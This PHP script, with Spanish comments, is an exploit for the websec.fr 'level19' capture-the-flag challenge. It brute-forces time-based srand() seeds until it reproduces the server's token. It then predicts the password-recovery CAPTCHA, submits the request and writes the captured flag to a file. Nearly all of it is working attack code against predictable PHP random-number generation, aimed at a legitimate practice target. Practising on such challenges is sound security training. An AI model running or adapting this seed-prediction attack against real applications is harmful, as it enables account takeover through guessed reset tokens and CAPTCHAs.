<?php
error_reporting(0);

// PHP 5.x usa el LCG (Linear Congruential Generator)
// con constantes específicas que pueden diferir de PHP 7/8

function generate_random_text($length) {
    $chars  = "abcdefghijklmnopqrstuvwxyz";
    $chars .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $chars .= "1234567890";

    $text = '';
    for($i = 0; $i < $length; $i++) {
        $text .= $chars[rand() % strlen($chars)];
    }
    return $text;
}

echo "╔════════════════════════════════════════════════════════════╗\n";
echo "║    PHP 5.6 COMPATIBILITY ATTACK                            ║\n";
echo "╚════════════════════════════════════════════════════════════╝\n\n";

echo "Testing if PHP version difference affects PRNG...\n";
echo "Local PHP version: " . PHP_VERSION . "\n";
echo "Server PHP version: 5.6.26-1\n\n";

// Generar algunos samples con nuestro PHP para comparar
echo "Sample tokens with current PHP:\n";
for ($i = 0; $i < 5; $i++) {
    $seed = time() + $i;
    srand($seed);
    $token = generate_random_text(32);
    echo "  Seed $seed: " . substr($token, 0, 16) . "...\n";
}
echo "\n";

$round = 0;

while (true) {
    $round++;
    
    $ch = curl_init("https://websec.fr/level19/index.php");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    
    if (!$response) {
        sleep(1);
        continue;
    }
    
    if (!preg_match('/PHPSESSID=([a-z0-9]+)/i', $response, $matches)) continue;
    $session_id = $matches[1];
    
    $parts = explode("\r\n\r\n", $response, 2);
    $body = isset($parts[1]) ? $parts[1] : $response;
    
    if (!preg_match('/name="token" value="([^"]+)"/', $body, $token_match)) continue;
    $real_token = $token_match[1];
    
    echo "[Round $round] Token from server (PHP 5.6): " . substr($real_token, 0, 16) . "...\n";
    
    // Intentar con TODOS los segundos del día de hoy + ayer
    $today_start = strtotime('today');
    $yesterday_start = $today_start - 86400;
    
    for ($seed = $yesterday_start; $seed <= time() + 3600; $seed++) {
        srand($seed);
        $test_token = generate_random_text(32);
        
        if ($test_token === $real_token) {
            echo "\n  ✓✓✓ MATCH! Seed: $seed (" . date('Y-m-d H:i:s', $seed) . ") ✓✓✓\n";
            
            srand($seed);
            generate_random_text(32);
            $captcha = generate_random_text(25);
            
            echo "  CAPTCHA: $captcha\n";
            
            $post_data = http_build_query([
                'captcha' => $captcha,
                'token' => $real_token,
                'submit' => ''
            ]);
            
            $ch = curl_init("https://websec.fr/level19/index.php");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
            curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=" . $session_id);
            $result = curl_exec($ch);
            curl_close($ch);
            
            if (strpos($result, 'Password recovery email sent') !== false) {
                echo "\n  SUCCESS!\n";
                if (preg_match('/WEBSEC\{[^}]+\}/', $result, $flag_match)) {
                    echo "  FLAG: " . $flag_match[0] . "\n";
                    file_put_contents('/workspace/websec_level19/FLAG.txt', $flag_match[0] . "\n");
                    exit(0);
                }
            }
            break;
        }
    }
    
    echo "  Tested " . (time() + 3600 - $yesterday_start) . " seeds\n";
    usleep(100000);
}
?>